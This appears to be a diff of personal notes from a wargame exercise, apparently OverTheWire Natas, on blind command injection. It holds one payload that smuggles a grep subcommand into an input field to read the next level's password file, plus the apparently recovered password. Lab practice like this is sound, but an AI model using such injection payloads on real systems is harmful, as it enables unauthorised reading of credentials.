@@ -1,0 +1,7 @@
+
+use grep for true or false. Can use this to blind inject for the password. 
+^ this means starting with this char. 
+$(grep ^8.* /etc/natas_webpass/natas17)Africans
+
+
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
